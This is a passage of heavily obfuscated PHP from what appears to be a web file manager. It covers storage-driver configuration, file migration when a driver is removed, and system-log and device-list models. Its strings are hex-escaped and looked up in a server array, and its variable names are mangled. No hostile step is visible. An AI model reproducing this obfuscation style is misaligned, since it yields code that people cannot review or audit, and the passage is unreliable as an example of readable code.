parent::update($®ÆˆüİÁ[$¼ÁÕ•…Š[401]], array($¼ÁÕ•…Š[47] => 0)); } } } return $®¿¿Â´®; } public function checkConfig(&$¦½°¼Ç», $ßĞ·æ¼£ = false) { $Á¦•‚˜¡ =& $_SERVER[¹àö™Ç¾]; $ˆ¹·³Ï = strtolower($¦½°¼Ç»[$Á¦•‚˜¡[106]]); $åâë÷«Ô = json_decode($¦½°¼Ç»[$Á¦•‚˜¡[16]], !0); foreach ($åâë÷«Ô as $ƒ¯Ñò†Á => $ÓŸá±š) { $åâë÷«Ô[$ƒ¯Ñò†Á] = trim($ÓŸá±š); } $åâë÷«Ô[$Á¦•‚˜¡[2114]] = rand_string(6); $×šÁâÖ³ = $GLOBALS[$Á¦•‚˜¡[16]][$Á¦•‚˜¡[100]][$Á¦•‚˜¡[818]]; $¾¤‰¨† = isset($×šÁâÖ³[$ˆ¹·³Ï]) ? $×šÁâÖ³[$ˆ¹·³Ï] : ucfirst($ˆ¹·³Ï); $—ÚÂù€ = $Á¦•‚˜¡[84] . $¾¤‰¨†; if (!$¾¤‰¨† || !class_exists($—ÚÂù€)) { if ($ßĞ·æ¼£) { return LNG($Á¦•‚˜¡[2115]); } write_log(array($Á¦•‚˜¡[2116], $¦½°¼Ç», get_caller_info()), $Á¦•‚˜¡[2117]); show_json(LNG($Á¦•‚˜¡[2115]), !1, $¦½°¼Ç»); } $ÃŒã×ĞÅ = new $—ÚÂù€($åâë÷«Ô); if (in_array($ˆ¹·³Ï, $ÃŒã×ĞÅ->objectDriver)) { if (!$ÃŒã×ĞÅ->isBucketCors() && !$ÃŒã×ĞÅ->setBucketCors()) { $¥ËŒ”ü = LNG($Á¦•‚˜¡[2118]); $¥ËŒ”ü .= $Á¦•‚˜¡[2119] . LNG($Á¦•‚˜¡[2120]); if ($ßĞ·æ¼£) { return $¥ËŒ”ü; } show_json($¥ËŒ”ü, !1); } } $àÇ®»Ôˆ = rtrim($åâë÷«Ô[$Á¦•‚˜¡[1164]], $Á¦•‚˜¡[18]) . $Á¦•‚˜¡[18]; $÷úÅŞÊ± = $ÃŒã×ĞÅ->getPath($àÇ®»Ôˆ . $Á¦•‚˜¡[1226]); if (!$ÃŒã×ĞÅ->mkfile($÷úÅŞÊ±)) { if ($ßĞ·æ¼£) { return LNG($Á¦•‚˜¡[2118]); } show_json(LNG($Á¦•‚˜¡[2118]), !1); } $åâë÷«Ô[$Á¦•‚˜¡[1164]] = $àÇ®»Ôˆ; $¦½°¼Ç»[$Á¦•‚˜¡[16]] = json_encode($åâë÷«Ô); $¦½°¼Ç»[$Á¦•‚˜¡[106]] = $¾¤‰¨†; return !0; } public function driverListSystem() { $À›£ÁêÔ =& $_SERVER[¹àö™Ç¾]; $·«ñ¯Èë = parent::listData(); $‹Ÿş ¦¿ = array(); foreach ($·«ñ¯Èë as $²úÃ¯ûè) { unset($²úÃ¯ûè[$À›£ÁêÔ[203]], $²úÃ¯ûè[$À›£ÁêÔ[96]]); $²úÃ¯ûè[$À›£ÁêÔ[16]] = json_decode($²úÃ¯ûè[$À›£ÁêÔ[16]], !0); $‹Ÿş ¦¿[] = $²úÃ¯ûè; } return $‹Ÿş ¦¿; } public function defaultDriver() { $ÀÔÒè =& $_SERVER[¹àö™Ç¾]; $Øé±˜¾© = parent::listData(); $…â¨šƒ× = array_filter_by_field($Øé±˜¾©, $ÀÔÒè[47], 1); $…â¨šƒ× = $…â¨šƒ×[0]; if ($…â¨šƒ×) { $…â¨šƒ×[$ÀÔÒè[16]] = json_decode($…â¨šƒ×[$ÀÔÒè[16]], !0); } return $…â¨šƒ×; } public function driverInfo($‰ü“µ¯À) { $œ¸âÓµ =& $_SERVER[¹àö™Ç¾]; $ûŸÒêï = array_to_keyvalue(parent::listData(), $œ¸âÓµ[401]); if (!isset($ûŸÒêï[$‰ü“µ¯À])) { return !1; } $ñººœ¥‘ = $ûŸÒêï[$‰ü“µ¯À]; $ñººœ¥‘[$œ¸âÓµ[16]] = json_decode($ñººœ¥‘[$œ¸âÓµ[16]], !0); return $ñººœ¥‘; } public function remove($ÌÍ¯àê) { $this->removeShareItems($ÌÍ¯àê); return parent::remove($ÌÍ¯àê); } public function removeWithFile($ “æ°æ¼, $”–§‹®) { $ßú–ùÂ =& $_SERVER[¹àö™Ç¾]; $Õ¶¼ÛãŒ = array($ßú–ùÂ[809] => $ “æ°æ¼); $ìäÁó = Model($ßú–ùÂ[470])->where($Õ¶¼ÛãŒ)->count(); $±Ù†¸ÁË = Model($ßú–ùÂ[470])->where($Õ¶¼ÛãŒ)->sum($ßú–ùÂ[90]); $¸©Ëâ˜Ë = $”–§‹® . $ßú–ùÂ[2121] . $ “æ°æ¼; $Áø¬ºáø = new TaskFileTransfer($¸©Ëâ˜Ë, $ßú–ùÂ[2117], $ìäÁó, LNG($ßú–ùÂ[2122]) . "\50{$ “æ°æ¼}\x29"); $Áø¬ºáø->task[$ßú–ùÂ[755]] = (double) $±Ù†¸ÁË; $™æˆëˆÙ = KodIO::defaultDriver(); $‰¾¸‘¥Ô = $™æˆëˆÙ[$ßú–ùÂ[401]]; $ê±›Åñ = "\173\x69\157\72{$‰¾¸‘¥Ô}\x7d\x2f"; $ äğ€Œ = !0; $Ğ®·©” = array(); $¶ş¢†±Ò = Model($ßú–ùÂ[202])->where($Õ¶¼ÛãŒ)->field($ßú–ùÂ[2123])->select(); foreach ($¶ş¢†±Ò as $¿Õù‚çò) { $ÓéÚéÚ = $¿Õù‚çò[$ßú–ùÂ[88]]; $ÀØÎ†ãö = $ê±›Åñ . str_replace("\173\x69\x6f\x3a{$ “æ°æ¼}\x7d\57", $ßú–ùÂ[22], $ÓéÚéÚ); if (!IO::exist($ÓéÚéÚ)) { $Ğ®·©”[] = $¿Õù‚çò[$ßú–ùÂ[467]]; $Áø¬ºáø->updateFileEnd($¿Õù‚çò[$ßú–ùÂ[42]], $¿Õù‚çò[$ßú–ùÂ[90]]); continue; } if (IO::exist($ÀØÎ†ãö)) { $Áø¬ºáø->updateFileEnd($¿Õù‚çò[$ßú–ùÂ[42]], $¿Õù‚çò[$ßú–ùÂ[90]]); continue; } if (!IO::move($ÓéÚéÚ, get_path_father($ÀØÎ†ãö))) { $ äğ€Œ = !1; break; } $Õ¶¼ÛãŒ = array($ßú–ùÂ[467] => $¿Õù‚çò[$ßú–ùÂ[467]]); $„òÃ†À = array($ßú–ùÂ[809] => $‰¾¸‘¥Ô, $ßú–ùÂ[88] => $ÀØÎ†ãö); Model($ßú–ùÂ[202])->where($Õ¶¼ÛãŒ)->save($„òÃ†À); } $this->removeByFileID($Ğ®·©”); if (!$ äğ€Œ) { $Áø¬ºáø->stop($¸©Ëâ˜Ë); return !1; } $Áø¬ºáø->end(); if ($”–§‹® == $ßú–ùÂ[1777]) { $this->remove($ “æ°æ¼); } } public function progress($ãô¸ÜšÆ, $Ô¹ÖˆÚ‡) { return Task::get($Ô¹ÖˆÚ‡ . $_SERVER[¹àö™Ç¾][2121] . $ãô¸ÜšÆ); } private function removeByFileID($°öëä„Ş = array()) { $­¼öÕÔç =& $_SERVER[¹àö™Ç¾]; if (empty($°öëä„Ş)) { return; } $³´ó“õ = array($­¼öÕÔç[467] => array($­¼öÕÔç[17], $°öëä„Ş)); $ÑãĞÎÖ‹ = Model($­¼öÕÔç[1310])->where($³´ó“õ)->field($­¼öÕÔç[403])->select(); if (!$ÑãĞÎÖ‹) { return; } $ÑãĞÎÖ‹ = array_to_keyvalue($ÑãĞÎÖ‹, $­¼öÕÔç[22], $­¼öÕÔç[403]); foreach ($ÑãĞÎÖ‹ as $…ÃÂŞ˜É) { Model($­¼öÕÔç[417])->removeNow($…ÃÂŞ˜É, !1); } } private function removeShareItems($¨£¸€œà) { $¢¬è ¬€ =& $_SERVER[¹àö™Ç¾]; $Â³ˆº•Ó = "\173\x69\x6f\x3a{$¨£¸€œà}\x7d\x2f"; $¸Ù˜É = array($¢¬è ¬€[403] => 0, $¢¬è ¬€[1159] => array($¢¬è ¬€[387], "{$Â³ˆº•Ó}\45")); $»éÄ¬ƒ = Model($¢¬è ¬€[1788])->where($¸Ù˜É)->field($¢¬è ¬€[488])->select(); if (empty($»éÄ¬ƒ)) { return; } $«ÙßØïö = array_to_keyvalue($»éÄ¬ƒ, $¢¬è ¬€[22], $¢¬è ¬€[488]); Model($¢¬è ¬€[595])->remove($«ÙßØïö); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\114\151\147\x68\x74\x41\160\160"; public $modelType = "\x53\171\163\x74\145\x6d\x4f\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\x67\162\157\x75\160", "\x64\145\x73\x63", "\143\157\156\164\145\x6e\x74"); public function listData($ñÅÂ·îó = false, $–Ò‹û¦¤ = "\155\157\144\x69\x66\x79\124\x69\x6d\145", $‡Ù­ªÇ = true) { return parent::listData($ñÅÂ·îó, $–Ò‹û¦¤, $‡Ù­ªÇ); } public function remove($˜ÎÏÎœ) { $ë¶İÌöÒ = $this->findByName($˜ÎÏÎœ); if (!$ë¶İÌöÒ) { return !1; } return parent::remove($ë¶İÌöÒ[$_SERVER[¹àö™Ç¾][401]]); } public function add($úı¸ö”×) { if ($this->findByName($úı¸ö”×[$_SERVER[¹àö™Ç¾][42]])) { return !1; } return parent::insert($úı¸ö”×); } public function update($Ñ†ŠÜ›Ğ, $Õ×äõŸŠ) { $íıŒ»“ş =& $_SERVER[¹àö™Ç¾]; $òØ“¼Æ = $this->findByName($Ñ†ŠÜ›Ğ); $šà’œçĞ = $this->findByName($Õ×äõŸŠ[$íıŒ»“ş[42]]); if (!$òØ“¼Æ || $šà’œçĞ && $šà’œçĞ[$íıŒ»“ş[401]] != $òØ“¼Æ[$íıŒ»“ş[401]]) { return !1; } return parent::update($òØ“¼Æ[$íıŒ»“ş[401]], $Õ×äõŸŠ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\155\x5f\154\x6f\x67"; protected $dataAuto = array(array("\x63\x72\145\141\x74\145\x54\x69\x6d\x65", "\164\151\155\x65", "\151\156\163\145\x72\164", "\146\x75\x6e\143\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ôòÜ¶ˆï =& $_SERVER[¹àö™Ç¾]; return array($ôòÜ¶ˆï[2124] => LNG($ôòÜ¶ˆï[2125]), $ôòÜ¶ˆï[2126] => LNG($ôòÜ¶ˆï[2127]), $ôòÜ¶ˆï[1751] => LNG($ôòÜ¶ˆï[2128]), $ôòÜ¶ˆï[2129] => LNG($ôòÜ¶ˆï[2130]), $ôòÜ¶ˆï[2131] => LNG($ôòÜ¶ˆï[2132]), $ôòÜ¶ˆï[2133] => LNG($ôòÜ¶ˆï[2134]), $ôòÜ¶ˆï[2135] => LNG($ôòÜ¶ˆï[2136]), $ôòÜ¶ˆï[1781] => LNG($ôòÜ¶ˆï[2136]), $ôòÜ¶ˆï[1782] => LNG($ôòÜ¶ˆï[2137]), $ôòÜ¶ˆï[2138] => LNG($ôòÜ¶ˆï[2139]), $ôòÜ¶ˆï[2140] => LNG($ôòÜ¶ˆï[2141]), $ôòÜ¶ˆï[2142] => LNG($ôòÜ¶ˆï[2143]), $ôòÜ¶ˆï[2144] => LNG($ôòÜ¶ˆï[2145]), $ôòÜ¶ˆï[1779] => LNG($ôòÜ¶ˆï[2146]), $ôòÜ¶ˆï[2147] => LNG($ôòÜ¶ˆï[2148]), $ôòÜ¶ˆï[1786] => LNG($ôòÜ¶ˆï[2149]), $ôòÜ¶ˆï[2150] => LNG($ôòÜ¶ˆï[2151]), $ôòÜ¶ˆï[2152] => LNG($ôòÜ¶ˆï[2153]), $ôòÜ¶ˆï[2154] => LNG($ôòÜ¶ˆï[2155]), $ôòÜ¶ˆï[2156] => LNG($ôòÜ¶ˆï[2157]), $ôòÜ¶ˆï[1789] => LNG($ôòÜ¶ˆï[2158]), $ôòÜ¶ˆï[1790] => LNG($ôòÜ¶ˆï[2159]), $ôòÜ¶ˆï[2160] => LNG($ôòÜ¶ˆï[2161]), $ôòÜ¶ˆï[2162] => LNG($ôòÜ¶ˆï[2163]), $ôòÜ¶ˆï[2164] => LNG($ôòÜ¶ˆï[2165]), $ôòÜ¶ˆï[1784] => LNG($ôòÜ¶ˆï[2166]), $ôòÜ¶ˆï[2167] => LNG($ôòÜ¶ˆï[2168]), $ôòÜ¶ˆï[1783] => LNG($ôòÜ¶ˆï[2169]), $ôòÜ¶ˆï[2170] => LNG($ôòÜ¶ˆï[2171]), $ôòÜ¶ˆï[2172] => LNG($ôòÜ¶ˆï[2173]), $ôòÜ¶ˆï[2174] => LNG($ôòÜ¶ˆï[2175]), $ôòÜ¶ˆï[2176] => LNG($ôòÜ¶ˆï[2176]), $ôòÜ¶ˆï[2177] => LNG($ôòÜ¶ˆï[1755]), $ôòÜ¶ˆï[2178] => LNG($ôòÜ¶ˆï[2179]), $ôòÜ¶ˆï[2180] => LNG($ôòÜ¶ˆï[2181]), $ôòÜ¶ˆï[2182] => LNG($ôòÜ¶ˆï[2183]), $ôòÜ¶ˆï[2184] => LNG($ôòÜ¶ˆï[2185]), $ôòÜ¶ˆï[2186] => LNG($ôòÜ¶ˆï[2187]), $ôòÜ¶ˆï[2188] => LNG($ôòÜ¶ˆï[2188]), $ôòÜ¶ˆï[2189] => LNG($ôòÜ¶ˆï[2190]), $ôòÜ¶ˆï[2191] => LNG($ôòÜ¶ˆï[2192]), $ôòÜ¶ˆï[2193] => LNG($ôòÜ¶ˆï[2194]), $ôòÜ¶ˆï[2195] => LNG($ôòÜ¶ˆï[2196]), $ôòÜ¶ˆï[2197] => LNG($ôòÜ¶ˆï[2198]), $ôòÜ¶ˆï[2199] => LNG($ôòÜ¶ˆï[2200])); } private function typeFile() { $÷‹»ÙÂÌ =& $_SERVER[¹àö™Ç¾]; $ñ´çàÛ¥ = array($÷‹»ÙÂÌ[1786] => array($÷‹»ÙÂÌ[1787]), $÷‹»ÙÂÌ[2142] => array($÷‹»ÙÂÌ[2201]), $÷‹»ÙÂÌ[2144] => array($÷‹»ÙÂÌ[2202]), $÷‹»ÙÂÌ[1779] => array($÷‹»ÙÂÌ[1780]), $÷‹»ÙÂÌ[2152] => array(), $÷‹»ÙÂÌ[2154] => array(), $÷‹»ÙÂÌ[2156] => array(), $÷‹»ÙÂÌ[1789] => array($÷‹»ÙÂÌ[1791]), $÷‹»ÙÂÌ[1790] => array($÷‹»ÙÂÌ[1791]), $÷‹»ÙÂÌ[2160] => array($÷‹»ÙÂÌ[2203]), $÷‹»ÙÂÌ[2162] => array($÷‹»ÙÂÌ[2203]), $÷‹»ÙÂÌ[2164] => array($÷‹»ÙÂÌ[2204]), $÷‹»ÙÂÌ[2150] => array($÷‹»ÙÂÌ[2205]), $÷‹»ÙÂÌ[1784] => array($÷‹»ÙÂÌ[2206]), $÷‹»ÙÂÌ[2167] => array($÷‹»ÙÂÌ[2207]), $÷‹»ÙÂÌ[1783] => array($÷‹»ÙÂÌ[1785])); return $ñ´çàÛ¥; } private function typeAll() { $¤ñÍİÓ¼ =& $_SERVER[¹àö™Ç¾]; $¬œµÎ¨œ = $this->typeList; $’àû¶ = array_filter($this->typeFile()); foreach ($’àû¶ as $ğÎò¶«Ş => $æ—å–±) { $¬œµÎ¨œ[$æ—å–±[0]] = $¬œµÎ¨œ[$ğÎò¶«Ş]; } $¬œµÎ¨œ[$¤ñÍİÓ¼[1791]] = LNG($¤ñÍİÓ¼[2208]); $¬œµÎ¨œ[$¤ñÍİÓ¼[2203]] = LNG($¤ñÍİÓ¼[2209]); return $¬œµÎ¨œ; } public function addLog($ùöšõÅ©, $Šãì§™¡ = array()) { $ò´ÏëŸÉ =& $_SERVER[¹àö™Ç¾]; if (!isset($this->typeList[$ùöšõÅ©])) { return; } $ª‹µóğÈ = defined($ò´ÏëŸÉ[474]) && USER_ID ? USER_ID : (isset($Šãì§™¡[$ò´ÏëŸÉ[1640]]) ? $Šãì§™¡[$ò´ÏëŸÉ[1640]] : 0); if (!$ª‹µóğÈ) { $ª‹µóğÈ = (int) Session::get($ò´ÏëŸÉ[1940]); } $ÒÛß‹† = get_client_ip(); if (!$Šãì§™¡ || strlen(json_encode($Šãì§™¡)) >= 1024) { $Šãì§™¡ = array($ò´ÏëŸÉ[2210] => $ÒÛß‹†); } else { if (is_array($Šãì§™¡)) { $Šãì§™¡[$ò´ÏëŸÉ[2210]] = $ÒÛß‹†; } else { $Šãì§™¡ = array($ò´ÏëŸÉ[1176] => $Šãì§™¡, $ò´ÏëŸÉ[2210] => $ÒÛß‹†); } } $Šãì§™¡ = array($ò´ÏëŸÉ[1630] => Session::sign(), $ò´ÏëŸÉ[1631] => $ª‹µóğÈ, $ò´ÏëŸÉ[43] => $ùöšõÅ©, $ò´ÏëŸÉ[1633] => json_encode($Šãì§™¡)); parent::add($Šãì§™¡); } public function remove($øÎ€À©Ï) { $this->where(array($_SERVER[¹àö™Ç¾][420] => $øÎ€À©Ï))->delete(); } private function _makeOrder($¦ñ¯ÄçÀ = '') { $Œ¢±ëô =& $_SERVER[¹àö™Ç¾]; $ıÑÅŠ³ = $Œ¢±ëô[203]; $âŠš¢¥„ = array($Œ¢±ëô[448] => $Œ¢±ëô[449], $Œ¢±ëô[450] => $Œ¢±ëô[451]); $¬û£ã’¤ = Input::get($Œ¢±ëô[456], $Œ¢±ëô[17], $Œ¢±ëô[1972], array($Œ¢±ëô[1898], $Œ¢±ëô[450])); $¬û£ã’¤ = $âŠš¢¥„[$¬û£ã’¤]; $¦ñ¯ÄçÀ = $¦ñ¯ÄçÀ . "{$ıÑÅŠ³}\x20{$¬û£ã’¤}"; return $this->order($¦ñ¯ÄçÀ); } public function get($Ì×÷÷Š¼ = '') { $²®œ’îß =& $_SERVER[¹àö™Ç¾]; if (!$Ì×÷÷Š¼) { show_json(array()); } $«ÇÑÓš = array(); if ($Ì×÷÷Š¼[$²®œ’îß[1640]]) { $«ÇÑÓš[$²®œ’îß[1640]] = $Ì×÷÷Š¼[$²®œ’îß[1640]]; } if (isset($Ì×÷÷Š¼[$²®œ’îß[753]])) { $…ú¼ÚÂŸ = $Ì×÷÷Š¼[$²®œ’îß[753]]; $¯”«æÔ  = isset($Ì×÷÷Š¼[$²®œ’îß[496]]) ? $Ì×÷÷Š¼[$²®œ’îß[496]] : time(); $«ÇÑÓš[$²®œ’îß[203]] = array($²®œ’îß[337], array($…ú¼ÚÂŸ, $¯”«æÔ )); } if ($Ì×÷÷Š¼[$²®œ’îß[43]]) { $à‡É¾«“ = explode($²®œ’îß[60], $Ì×÷÷Š¼[$²®œ’îß[43]]); $ñÀ¸Ä¦ª = $this->typeFile(); $¢Ç–õã­ = array(); foreach ($à‡É¾«“ as $¬Ğ ê) { $¢Ç–õã­[] = $¬Ğ ê; if (isset($ñÀ¸Ä¦ª[$¬Ğ ê])) { $¢Ç–õã­ = array_merge($¢Ç–õã­, $ñÀ¸Ä¦ª[$¬Ğ ê]); } } $¢Ç–õã­ = array_unique($¢Ç–õã­); if ($¢Ç–õã­) { $«ÇÑÓš[$²®œ’îß[43]] = array($²®œ’îß[17], $¢Ç–õã­); } } else { $«ÇÑÓš[$²®œ’îß[43]] = array($²®œ’îß[2211], $²®œ’îß[2212]); } if (!empty($Ì×÷÷Š¼[$²®œ’îß[2210]])) { $«ÇÑÓš[$²®œ’îß[451]] = array($²®œ’îß[387], "\45{$Ì×÷÷Š¼[$²®œ’îß[2210]]}\x25"); } $—ÕßÏİ¤ = $this->_makeOrder()->where($«ÇÑÓš)->selectPage(); if (empty($—ÕßÏİ¤[$²®œ’îß[373]])) { show_json(array(), !0, $—ÕßÏİ¤[$²®œ’îß[370]]); } $—ÕßÏİ¤[$²®œ’îß[373]] = $this->logList($—ÕßÏİ¤[$²®œ’îß[373]]); return $—ÕßÏİ¤; } private function ipAddress(&$Ûß¹´İ) { $ºôê‡Ï =& $_SERVER[¹àö™Ç¾]; if (!empty($Ûß¹´İ[$ºôê‡Ï[2210]])) { $Ã½äÈÌÄ = IpLocation::get($Ûß¹´İ[$ºôê‡Ï[2210]]); } else { $Ã½äÈÌÄ = LNG($ºôê‡Ï[2213]); } $Ûß¹´İ[$ºôê‡Ï[2214]] = $Ã½äÈÌÄ; } private function descZipDownload($ş‡ŞıÛÈ, &$ÇÂ‘œûé) { $œÌ‹Éü“ =& $_SERVER[¹àö™Ç¾]; if (!isset($ş‡ŞıÛÈ[$œÌ‹Éü“[2215]])) { return; } $Ğ”â£ü‘ = json_decode($ş‡ŞıÛÈ[$œÌ‹Éü“[2215]], !0); foreach ($Ğ”â£ü‘ as $Ò³’‘ä) { try { $·İÜ±º£ = IO::infoFull($Ò³’‘ä[$œÌ‹Éü“[88]]); } catch (Exception $öÅ¼Ô†) { continue; } $ş‡ŞıÛÈ[$œÌ‹Éü“[88]] = $Ò³’‘ä[$œÌ‹Éü“[88]]; $ÇÂ‘œûé[] = $ş‡ŞıÛÈ[$œÌ‹Éü“[403]] = $·İÜ±º£[$œÌ‹Éü“[403]]; $ÇÂ‘œûé[] = $ş‡ŞıÛÈ[$œÌ‹Éü“[2026]] = $·İÜ±º£[$œÌ‹Éü“[498]]; break; } return $ş‡ŞıÛÈ; } private function getSourceList(&$›”ú±Éü) { $È¾ßÛ½ =& $_SERVER[¹àö™Ç¾]; $ğ¨ÛÇ‹Ã = array(); foreach ($›”ú±Éü as $ìÃ‘‘©¢ => $ş¹ëµ†) { $³Ú±ì¶§ = json_decode($ş¹ëµ†[$È¾ßÛ½[451]], !0); if ($ş¹ëµ†[$È¾ßÛ½[43]] == $È¾ßÛ½[1782]) { $³Ú±ì¶§ = $this->descZipDownload($³Ú±ì¶§, $ğ¨ÛÇ‹Ã); $›”ú±Éü[$ìÃ‘‘©¢][$È¾ßÛ½[451]] = json_encode($³Ú±ì¶§); continue; } if (strpos($ş¹ëµ†[$È¾ßÛ½[43]], $È¾ßÛ½[2028]) !== 0) { if (!isset($³Ú±ì¶§[$È¾ßÛ½[88]]) || strpos($ş¹ëµ†[$È¾ßÛ½[43]], $È¾ßÛ½[2216]) !== 0) { continue; } try { $ää´‹æË = IO::infoFull($³Ú±ì¶§[$È¾ßÛ½[88]]); } catch (Exception $­Üãé¿½) { continue; } $ğ¨ÛÇ‹Ã[] = $³Ú±ì¶§[$È¾ßÛ½[403]] = $ää´‹æË[$È¾ßÛ½[403]]; $ğ¨ÛÇ‹Ã[] = $³Ú±ì¶§[$È¾ßÛ½[2026]] = $ää´‹æË[$È¾ßÛ½[498]]; $›”ú±Éü[$ìÃ‘‘©¢][$È¾ßÛ½[451]] = json_encode($³Ú±ì¶§); continue; } $ğ¨ÛÇ‹Ã[] = $³Ú±ì¶§[$È¾ßÛ½[403]]; $ğ¨ÛÇ‹Ã[] = $³Ú±ì¶§[$È¾ßÛ½[2026]]; if ($³Ú±ì¶§[$È¾ßÛ½[43]] == $È¾ßÛ½[551]) { $ğ¨ÛÇ‹Ã[] = $³Ú±ì¶§[$È¾ßÛ½[451]][$È¾ßÛ½[1143]]; $ğ¨ÛÇ‹Ã[] = $³Ú±ì¶§[$È¾ßÛ½[451]][$È¾ßÛ½[1144]]; } if ($³Ú±ì¶§[$È¾ßÛ½[43]] == $È¾ßÛ½[2035]) { $ğ¨ÛÇ‹Ã[] = $³Ú±ì¶§[$È¾ßÛ½[451]][$È¾ßÛ½[403]]; } } if (!$ğ¨ÛÇ‹Ã) { return array(); } return Model($È¾ßÛ½[817])->sourceListInfo($ğ¨ÛÇ‹Ã, !0); } private function logList($ÍÍŞÜÖÆ) { $ ìµéÆ =& $_SERVER[¹àö™Ç¾]; $­–Û°ş = array_to_keyvalue($ÍÍŞÜÖÆ, $ ìµéÆ[22], $ ìµéÆ[1640]); $´¡©…ÃÉ = Model($ ìµéÆ[538])->userListInfo(array_unique($­–Û°ş)); $ìñ“ÇÃĞ = $this->getSourceList($ÍÍŞÜÖÆ); $¤³ç¥ª­ = $this->typeAll(); $¶ŸéÑÁç = array(); $¡áËûÒ = array(); foreach ($ÍÍŞÜÖÆ as $»’×­¨å => $úàÎ¼Œ) { $¶¾ÁæÓ = $úàÎ¼Œ[$ ìµéÆ[43]]; $ÉĞ¡èºß = isset($´¡©…ÃÉ[$úàÎ¼Œ[$ ìµéÆ[1640]]]) ? $´¡©…ÃÉ[$úàÎ¼Œ[$ ìµéÆ[1640]]] : !1; $Àö¾Îö = strpos($¶¾ÁæÓ, $ ìµéÆ[2217]) === 0 ? LNG($ ìµéÆ[2218]) : LNG($ ìµéÆ[2213]); $úàÎ¼Œ[$ ìµéÆ[42]] = isset($ÉĞ¡èºß[$ ìµéÆ[42]]) ? $ÉĞ¡èºß[$ ìµéÆ[42]] : LNG($ ìµéÆ[2213]); $úàÎ¼Œ[$ ìµéÆ[2076]] = isset($ÉĞ¡èºß[$ ìµéÆ[2076]]) ? $ÉĞ¡èºß[$ ìµéÆ[2076]] : $ ìµéÆ[22]; $úàÎ¼Œ[$ ìµéÆ[1540]] = isset($¤³ç¥ª­[$¶¾ÁæÓ]) ? $¤³ç¥ª­[$¶¾ÁæÓ] : $Àö¾Îö; $úàÎ¼Œ[$ ìµéÆ[1971]] = $ÉĞ¡èºß; $ŠŒ…–‹ = json_decode($úàÎ¼Œ[$ ìµéÆ[451]], !0); $úàÎ¼Œ[$ ìµéÆ[2210]] = isset($ŠŒ…–‹[$ ìµéÆ[2210]]) ? $ŠŒ…–‹[$ ìµéÆ[2210]] : $ ìµéÆ[22]; $úàÎ¼Œ[$ ìµéÆ[2214]] = IpLocation::get($úàÎ¼Œ[$ ìµéÆ[2210]]); if (strpos($¶¾ÁæÓ, $ ìµéÆ[2028]) === 0 || isset($ŠŒ…–‹[$ ìµéÆ[2026]])) { $ŠŒ…–‹[$ ìµéÆ[97]] = $ìñ“ÇÃĞ[$ŠŒ…–‹[$ ìµéÆ[403]]]; $ŠŒ…–‹[$ ìµéÆ[2040]] = $ìñ“ÇÃĞ[$ŠŒ…–‹[$ ìµéÆ[2026]]]; if ($ŠŒ…–‹[$ ìµéÆ[43]] == $ ìµéÆ[551]) { $ŠŒ…–‹[$ ìµéÆ[451]][$ ìµéÆ[1143]] = $ìñ“ÇÃĞ[$ŠŒ…–‹[$ ìµéÆ[451]][$ ìµéÆ[1143]]]; $ŠŒ…–‹[$ ìµéÆ[451]][$ ìµéÆ[1144]] = $ìñ“ÇÃĞ[$ŠŒ…–‹[$ ìµéÆ[451]][$ ìµéÆ[1144]]]; } if ($ŠŒ…–‹[$ ìµéÆ[43]] == $ ìµéÆ[2035]) { $ŠŒ…–‹[$ ìµéÆ[451]][$ ìµéÆ[403]] = $ìñ“ÇÃĞ[$ŠŒ…–‹[$ ìµéÆ[451]][$ ìµéÆ[403]]]; } if ($ŠŒ…–‹[$ ìµéÆ[43]] == $ ìµéÆ[1777]) { $ŠŒ…–‹[$ ìµéÆ[2040]] = $ŠŒ…–‹[$ ìµéÆ[97]]; $ŠŒ…–‹[$ ìµéÆ[2026]] = $ŠŒ…–‹[$ ìµéÆ[2040]][$ ìµéÆ[403]]; $ŠŒ…–‹[$ ìµéÆ[97]] = !1; $ŠŒ…–‹[$ ìµéÆ[403]] = $ ìµéÆ[22]; } if ($ŠŒ…–‹[$ ìµéÆ[97]] && $ŠŒ…–‹[$ ìµéÆ[97]][$ ìµéÆ[412]] == $ ìµéÆ[1259]) { $¡áËûÒ[] = $úàÎ¼Œ[$ ìµéÆ[401]]; unset($ÍÍŞÜÖÆ[$»’×­¨å]); continue; } if ($ŠŒ…–‹[$ ìµéÆ[2040]] && $ŠŒ…–‹[$ ìµéÆ[2040]][$ ìµéÆ[412]] == $ ìµéÆ[1259]) { $¡áËûÒ[] = $úàÎ¼Œ[$ ìµéÆ[401]]; unset($ÍÍŞÜÖÆ[$»’×­¨å]); continue; } } $úàÎ¼Œ[$ ìµéÆ[451]] = $ŠŒ…–‹; unset($úàÎ¼Œ[$ ìµéÆ[2219]]); $¶ŸéÑÁç[] = $úàÎ¼Œ; } $this->clearSystemPathLog($¡áËûÒ); return $¶ŸéÑÁç; } private function clearSystemPathLog($š¬‚Şİ) { $éùùüÔÜ =& $_SERVER[¹àö™Ç¾]; if (count($š¬‚Şİ) == 0) { return; } $ÔŒĞ¥Ü = array($éùùüÔÜ[401] => array($éùùüÔÜ[17], array_unique($š¬‚Şİ))); $this->where($ÔŒĞ¥Ü)->delete(); } public function deviceList($ğŠ˜ıâ¯, $ê±û¸Í¾ = 0) { $àÒá¥Åë =& $_SERVER[¹àö™Ç¾]; $¹ùîâú¡ = array($àÒá¥Åë[1640] => $ğŠ˜ıâ¯, $àÒá¥Åë[203] => array($àÒá¥Åë[999], $ê±û¸Í¾), $àÒá¥Åë[43] => $àÒá¥Åë[1751]); $°©†‚’ = array(); $Ê…¡Çí = $this->field($àÒá¥Åë[2220])->where($¹ùîâú¡)->order($àÒá¥Åë[2038])->limit(50)->select(); foreach ($Ê…¡Çí as $ŠŞÍñ½— => $ØÂºš) { if ($ŠŞÍñ½— > 0 && abs($ØÂºš[$àÒá¥Åë[203]] - $Ê…¡Çí[$ŠŞÍñ½— - 1][$àÒá¥Åë[203]]) < 5) { continue; } $¯Ò†¡üè = json_decode($ØÂºš[$àÒá¥Åë[451]], !0); $ØÂºš[$àÒá¥Åë[2210]] = isset($¯Ò†¡üè[$àÒá¥Åë[2210]]) ? $¯Ò†¡üè[$àÒá¥Åë[2210]] : $àÒá¥Åë[22]; unset($¯Ò†¡üè[$àÒá¥Åë[2210]]); $½Ğ‚š… = $this->deviceType($¯Ò†¡üè[$àÒá¥Åë[2029]]); if 